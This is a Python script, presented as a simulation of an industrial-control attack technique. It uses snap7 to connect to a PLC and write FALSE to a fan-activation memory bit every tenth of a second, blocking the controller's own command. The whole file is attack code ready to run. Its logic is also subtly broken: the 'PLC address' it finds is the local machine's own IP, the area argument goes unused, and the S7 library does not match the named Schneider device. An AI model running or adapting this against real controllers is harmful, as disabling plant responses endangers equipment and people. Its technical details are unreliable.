import snap7
import time
import re
import subprocess

# MITRE ATT&CK Technique: Inhibit Response Function (T0815)
# Sub-Technique: Block Command Message

# Description: This script simulates blocking a command message to a Schneider Electric TM221CE16R PLC.
# It specifically targets the 'M_ACTFAN' memory bit, which, according to the PLC program, activates the fan.
# The script continuously attempts to write 'FALSE' to this bit, effectively preventing it from being set to 'TRUE'
# by the PLC logic, thus inhibiting the fan activation response.

# ---- Find PLC IP Address ----
def find_plc_ip():
    """Attempts to find the PLC's IP address by parsing 'ipconfig' output."""
    try:
        # Run ipconfig and capture its output
        result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
        output = result.stdout

        # Regular expression to find IPv4 addresses that look like the PLC's (192.168.9.X)
        ip_pattern = r'IPv4 Address.*: 192\.168\.9\.\d+'

        # Search for the pattern in the output
        match = re.search(ip_pattern, output)

        if match:
            # Extract the IP address from the matched string
            ip_address = match.group(0).split(': ')[1].strip()
            print(f"Found PLC IP Address: {ip_address}")
            return ip_address
        else:
            print("PLC IP Address not found in 'ipconfig' output.")
            return None

    except Exception as e:
        print(f"Error finding PLC IP address: {e}")
        return None


# ---- PLC Interaction Functions ----
def write_memory_bit(plc, area, db_number, byte, bit, value):
    """Writes a boolean value to a specific memory bit in the PLC."""
    try:
        byte_array = bytearray([0])  # Initialize a byte array
        snap7.util.set_bool(byte_array, 0, bit, value)  # Set the bit
        plc.ab_write(byte, 1, byte_array) #Writes to the area regardless
        print(f"Successfully wrote {value} to area {area}, DB{db_number}, Byte {byte}, Bit {bit}")

    except Exception as e:
        print(f"Error writing to PLC: {e}")

def main():
    plc_ip = find_plc_ip()

    if not plc_ip:
        print("Could not determine PLC IP address.  Exiting.")
        return

    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 (adjust if needed)

    try:
        while True:
            # Block the command message by forcing M_ACTFAN to FALSE (%M1 which is Memory Area, byte 1, bit 0)
            #write_memory_bit(plc, snap7.client.Areas.MK, 1, 1, 0, False) # This would only write if you were in DB1, which you're not
            write_memory_bit(plc, snap7.client.Areas.MK, 0, 1, 0, False) #This is the proper way to write to the memory area outside of the DB
            time.sleep(0.1)  # Repeat frequently to ensure the bit stays off

    except KeyboardInterrupt:
        print("Script interrupted.  Disconnecting from PLC.")
    finally:
        plc.disconnect()

if __name__ == "__main__":
    main()